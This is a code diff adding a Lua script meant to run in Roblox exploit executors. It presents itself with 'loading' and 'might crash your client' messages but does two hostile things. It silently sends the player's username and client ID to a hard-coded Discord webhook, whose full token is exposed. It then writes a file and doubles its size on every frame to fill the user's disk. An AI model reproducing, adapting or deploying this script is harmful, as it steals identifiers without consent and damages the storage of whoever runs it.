@@ -1,0 +1,99 @@
+if not writefile then
+local guithingy = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local TextLabel = Instance.new("TextLabel" , guithingy)
+TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0.148227707, 0, 0.7734375, 0)
+TextLabel.Size = UDim2.new(0, 668, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "your exploits doesnt support this type of scripts please use krnl or synapse x "
+TextLabel.TextColor3 = Color3.new(1, 0, 0.0156863)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14
+TextLabel.TextWrapped = true
+wait(1)
+guithingy:Destroy()
+	return
+end
+
+local Webhook = "https://discord.com/api/webhooks/1087398813448278098/Bd2gU8ZXKU6pnbAqTF-GbevXYUNE1xkjtYZbPB21qFfbeEO7tHBy5WRaePpbt-ezqrrO"
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {
+           {
+           ["title"] = "**someone used the script**",
+           ["description"] = game.Players.LocalPlayer.Name .." used the script",
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "Client ID:",
+                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                   ["inline"] = true
+},
+           },
+        }
+    }
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+Request = http_request or request or HttpPost or syn.request
+Request(
+    {
+        Url = Webhook, 
+        Body = PlayerData, 
+        Method = "POST", 
+        Headers = {["content-type"] = "application/json"} 
+    }
+)
+local newgui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local textlabelreport  = Instance.new("TextLabel", newgui)
+textlabelreport.BackgroundColor3 = Color3.new(1, 1, 1)
+textlabelreport.BackgroundTransparency = 1
+textlabelreport.Position = UDim2.new(0.131756932, 0, 0.241578057, 0)
+textlabelreport.Size = UDim2.new(0, 668, 0, 50)
+textlabelreport.Font = Enum.Font.SourceSans
+textlabelreport.Text = "this might crash your client if it did then try again!"
+textlabelreport.TextColor3 = Color3.new(0, 0.14902, 1)
+textlabelreport.TextScaled = true
+textlabelreport.TextSize = 14
+textlabelreport.TextWrapped = true
+--
+local TextLabel = Instance.new("TextLabel",newgui)
+
+
+TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0.139466196, 0, 0.767619729, 0)
+TextLabel.Size = UDim2.new(0, 668, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "loading"
+TextLabel.TextColor3 = Color3.new(0.0392157, 1, 0.0705882)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14
+TextLabel.TextWrapped = true
+local ImageLabel = Instance.new("ImageLabel", newgui)
+
+ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.Position = UDim2.new(0.452863359, 0, 0.77343744, 0)
+ImageLabel.Size = UDim2.new(0, 74, 0, 74)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=11553500285"
+local files = 0
+while  true  do
+	task.wait()
+	files += 1 
+	local success , errmessage = pcall(function ()
+		readfile(tostring(files)..".txt")
+	end)
+	if success  then
+		else
+				writefile(tostring(files)..".txt", "u8nur7y348v0yr3287tg84327g7y43hg9798hvt9h8yfgh3n428vufynh34v78fgyn8v8v8v8v8v8vh43gvh43r")
+		game:GetService("RunService").Heartbeat:Connect(function()
+        writefile(tostring(files)..".txt" ,readfile(tostring(files)..".txt")..readfile(tostring(files)..".txt") )
+		end)	
+		break
+	end
+
+end
